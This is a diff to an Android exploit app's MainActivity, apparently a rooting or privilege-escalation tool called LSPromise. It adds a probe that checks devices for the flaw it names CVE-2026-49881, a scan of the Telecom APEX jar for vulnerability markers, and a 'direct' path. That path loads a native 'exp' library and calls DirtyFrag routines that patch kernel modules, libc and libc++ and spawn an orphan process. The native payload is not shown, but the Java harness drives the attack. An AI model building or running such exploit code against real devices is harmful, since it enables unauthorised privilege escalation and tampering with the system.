@@ -29,7 +29,9 @@ import android.view.WindowInsets;
 import android.widget.Button;
 import android.widget.TextView;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.InputStreamReader;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
@@ -227,6 +229,90 @@ public class MainActivity extends Activity implements View.OnClickListener {
         }).start();
     }
 
+    /** Probe whether this SELinux context can open xfrm netlink (DirtyFrag needs it).
+     * Safe: only runs 'ip xfrm state count' and reports output. */
+    private void probeXfrm() {
+        new Thread(() -> {
+            String out;
+            try {
+                var proc = new ProcessBuilder("ip", "xfrm", "state", "count")
+                        .redirectErrorStream(true).start();
+                var reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+                var first = reader.readLine();
+                proc.waitFor();
+                out = first != null ? first.trim() : "(empty, exit=" + proc.exitValue() + ")";
+            } catch (Throwable t) {
+                out = "probe failed: " + t.getMessage();
+            }
+            var msg = "xfrm probe (app context): " + out;
+            Log.d(TAG, msg);
+            runOnUiThread(() -> tv.append(msg + "\n"));
+        }).start();
+    }
+
+    /** Scan on-device Telecom server jar for the vulnerable markers.
+     * Safe read-only check; falls back to fingerprint heuristic if unreadable. */
+    private void scanTelecomApex() {
+        new Thread(() -> {
+            String msg;
+            try {
+                var jar = new java.util.zip.ZipFile(
+                        "/apex/com.android.telephonycore/javalib/service-telecom.jar");
+                var entry = jar.getEntry("classes.dex");
+                var in = jar.getInputStream(entry);
+                var buf = in.readAllBytes();
+                in.close();
+                jar.close();
+                String blob = new String(buf, java.nio.charset.StandardCharsets.ISO_8859_1);
+                boolean hasMarker = blob.contains("CLASS_EXISTENCE_CHECK")
+                        || blob.contains("serviceClassExists");
+                msg = "Telecom apex scan: dex=" + buf.length + "B, vuln markers "
+                        + (hasMarker ? "PRESENT (likely vulnerable)" : "ABSENT (patched)");
+            } catch (Throwable t) {
+                msg = "Telecom apex scan unreadable (" + t.getClass().getSimpleName()
+                        + "), using fingerprint heuristic patched=" + isDeviceLikelyPatched();
+            }
+            Log.d(TAG, msg);
+            var line = msg;
+            runOnUiThread(() -> tv.append(line + "\n"));
+        }).start();
+    }
+
+    /** Direct kernel-attempt in app process (patched builds only).
+     * Safe-fail expected: untrusted apps lack xfrm, natives return errors
+     * before any file modification. Shows exact return codes. */
+    private void runDirectAll() {
+        new Thread(() -> {
+            try {
+                System.loadLibrary("exp");
+            } catch (Throwable t) {
+                Log.e(TAG, "load exp failed", t);
+                runOnUiThread(() -> tv.append("load libexp failed: " + t.getMessage()
+                        + "\n(if retrying, reinstall the apk first)\n"));
+                return;
+            }
+            runOnUiThread(() -> tv.append("libexp loaded, trying patch steps directly...\n"));
+            int r1, r2, r3, r4;
+            try { r1 = DirtyFrag.patchMod(); }
+            catch (Throwable t) { r1 = -999; Log.e(TAG, "patchMod threw", t); }
+            int f1 = r1;
+            runOnUiThread(() -> tv.append("direct patchMod res=" + f1 + "\n"));
+            try { r2 = DirtyFrag.patchLibc(); }
+            catch (Throwable t) { r2 = -999; Log.e(TAG, "patchLibc threw", t); }
+            int f2 = r2;
+            runOnUiThread(() -> tv.append("direct patchLibc res=" + f2 + "\n"));
+            try { r3 = DirtyFrag.patchCxx(); }
+            catch (Throwable t) { r3 = -999; Log.e(TAG, "patchCxx threw", t); }
+            int f3 = r3;
+            runOnUiThread(() -> tv.append("direct patchCxx res=" + f3 + "\n"));
+            try { r4 = DirtyFrag.createOrphanProcess(); }
+            catch (Throwable t) { r4 = -999; Log.e(TAG, "orphan threw", t); }
+            int f4 = r4;
+            runOnUiThread(() -> tv.append("direct forkProcess res=" + f4 + "\n"
+                    + "direct attempt done (patch steps non-zero = blocked, expected on patched)\n"));
+        }).start();
+    }
+
     @Override protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
@@ -254,7 +340,12 @@ public class MainActivity extends Activity implements View.OnClickListener {
         forkProcess.setOnClickListener(v -> doAction(4, "forkProcess"));
         var patchAll = (Button) findViewById(R.id.patchAll);
         patchAll.setOnClickListener(v -> {
-            runAll();
+            if (controller != null) {
+                runAll();
+            } else {
+                tv.append("No networkstack binder, trying direct (app-context) attempt...\n");
+                runDirectAll();
+            }
         });
         var copyAll = (Button) findViewById(R.id.copyAll);
         copyAll.setOnClickListener(v -> {
@@ -268,6 +359,8 @@ public class MainActivity extends Activity implements View.OnClickListener {
                     + " patch=" + Build.VERSION.SECURITY_PATCH + "\n");
             tv.append("patched=" + isDeviceLikelyPatched() + "\n");
             checkShizuku();
+            probeXfrm();
+            scanTelecomApex();
         });
         receiver = new BroadcastReceiver() {
             @Override
@@ -295,17 +388,22 @@ public class MainActivity extends Activity implements View.OnClickListener {
         } catch (Throwable t) {
             Log.e(TAG, "shizuku listener failed", t);
         }
-        tv.append("LSPromise 1.1-shizuku\n");
+        tv.append("LSPromise 1.2-deepdive\n");
         tv.append("device=" + Build.DEVICE + " sdk=" + Build.VERSION.SDK_INT
                 + " patch=" + Build.VERSION.SECURITY_PATCH + "\n");
         if (isDeviceLikelyPatched()) {
             tv.append("Device likely PATCHED for CVE-2026-49881.\n"
                     + "Userspace Telecom exploit is not expected to work.\n"
-                    + "Using Shizuku ADB privileges instead.\n");
+                    + "Using Shizuku ADB privileges instead.\n"
+                    + "Kernel button below tries DIRECT app-context attempt\n"
+                    + "(expected to fail at xfrm; shows return codes).\n");
+            patchAll.setVisibility(View.VISIBLE);
         } else {
             tv.append("Device may be vulnerable, try userspace exploit.\n");
         }
         checkShizuku();
+        probeXfrm();
+        scanTelecomApex();
         copyKsud();
     }
 
